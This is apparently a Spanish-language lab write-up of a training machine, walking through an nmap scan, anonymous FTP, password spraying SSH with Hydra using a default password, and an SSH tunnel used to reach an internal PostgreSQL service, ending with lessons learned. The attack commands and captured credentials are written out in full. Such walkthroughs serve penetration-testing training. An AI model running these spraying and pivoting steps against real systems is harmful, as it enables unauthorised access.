1. Reconocimiento / Enumeración

Empezamos con un escaneo de puertos con nmap, usando scripts por defecto (-sC) y detección de versiones (-sV).

bash 
sudo nmap -sC -sV {target_IP}

El escaneo revela solo 2 puertos abiertos:

21 vsftpd 3.0.3 (FTP) Externo
22 OpenSSH 8.2p1 (SSH) Externo
💡

Nmap detecta que el FTP permite login anónimo: ftp-anon: Anonymous FTP login allowed (FTP code 230). Esto es nuestro punto de entrada.

📂

3. Foothold — Password Spraying + SSH

Con la lista de usuarios y la contraseña default, hacemos un ataque de password spraying con Hydra contra el servicio SSH.

Primero creamos el archivo de usuarios:

bash 
echo -e "optimus\nalbert\nandreas\nchristine\nmaria" > usernames.txt

Lanzamos Hydra:

bash 
hydra -L usernames.txt -p 'funnel123#!#' {target_IP} ssh

[DATA] attacking ssh://10.129.228.195:22/
[22][ssh] host: 10.129.228.195   login: christine   password: funnel123#!#
1 of 1 target successfully completed, 1 valid password found
✅

christine no cambió la contraseña por defecto. Password spraying es especialmente útil porque evita bloqueos de cuenta: probamos la misma contraseña contra todos los usuarios.

Nos conectamos por SSH:

bash 
ssh christine@{target_IP}
Password: funnel123#!#

christine@funnel:~$ id
uid=1000(christine) gid=1000(christine) groups=1000(christine)

4. Enumeración Interna

Ya dentro de la máquina, usamos ss -tln para ver qué puertos están escuchando localmente:

bash 
ss -tln

State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port
LISTEN  0       4096    127.0.0.53%lo:53     0.0.0.0:*
LISTEN  0       128     0.0.0.0:22           0.0.0.0:*
LISTEN  0       4096    127.0.0.1:5432       0.0.0.0:*
LISTEN  0       4096    127.0.0.1:36137      0.0.0.0:*
LISTEN  0       32      *:21                 *:*
LISTEN  0       128     [::]:22              [::]:*

Descubrimos puertos internos que no eran visibles desde fuera:

21 FTP (vsftpd) Externo
22 SSH (OpenSSH) Externo
5432 PostgreSQL Solo Local
🚫

PostgreSQL escucha en 127.0.0.1:5432 — solo acepta conexiones locales. No podemos acceder directamente desde nuestra máquina. Además, psql no está instalado en el target.

🔒

5. Tunneling — Local Port Forwarding

El problema: necesitamos acceder a PostgreSQL (puerto 5432) que solo escucha localmente en el target, y no tenemos psql instalado allí. La solución es crear un túnel SSH con local port forwarding.

📘

Local Port Forwarding: Abre un puerto en tu máquina local que redirige el tráfico a través del túnel SSH hacia un puerto del servidor remoto. Sintaxis: ssh -L [local]:[host]:[remoto] user@target

bash — Terminal 1: Crear el túnel 
ssh -L 1234:localhost:5432 christine@{target_IP}
# Tu puerto 1234 → túnel SSH → puerto 5432 del target

El flujo del tráfico es el siguiente:

🐧 Tu :1234
→
🔒 SSH Tunnel
→
🖥️ Target :22
→
🗄️ PostgreSQL :5432

Ahora, en otra terminal, instalamos psql y nos conectamos al túnel:

bash — Terminal 2: Conectar a PostgreSQL 
# Instalar el cliente de PostgreSQL
sudo apt update && sudo apt install postgresql-client

# Conectar a través del túnel
psql -U christine -h localhost -p 1234
Password: funnel123#!#

psql (15.0 (Debian 15.0-2), server 15.1 (Debian 15.1-1.pgdg110+1))
christine=#
💡

Nos conectamos a localhost:1234 (nuestro puerto local), pero SSH reenvía todo al 5432 del target. PostgreSQL cree que es una conexión local — no sabe que venimos de fuera.

📎

Alternativa: También se podría usar dynamic port forwarding con ssh -D 1234 + proxychains. Es más flexible si necesitas acceder a varios puertos internos sin crear un túnel por cada uno.

🏁

7. Lecciones Aprendidas

1

FTP anónimo — Siempre verificar si el login anónimo está habilitado. Es una fuente común de información sensible (emails, documentos, credenciales).

2

Contraseñas por defecto — Los usuarios no siempre cambian las credenciales default. El password spraying es efectivo y evita bloqueos de cuenta al probar una sola contraseña contra muchos usuarios.

3

Enumeración post-acceso — Siempre ejecutar ss -tln tras obtener acceso. Los servicios internos (como bases de datos) suelen esconder información crítica que no es visible desde fuera.

4

SSH Local Port Forwarding — Permite acceder a servicios internos que solo escuchan en localhost. Es fundamental para pivotar dentro de redes: ssh -L [local]:[host]:[remoto] user@target.

5

Dynamic Port Forwarding — Para acceder a múltiples puertos internos, ssh -D + proxychains es más flexible que crear un túnel local por cada servicio.
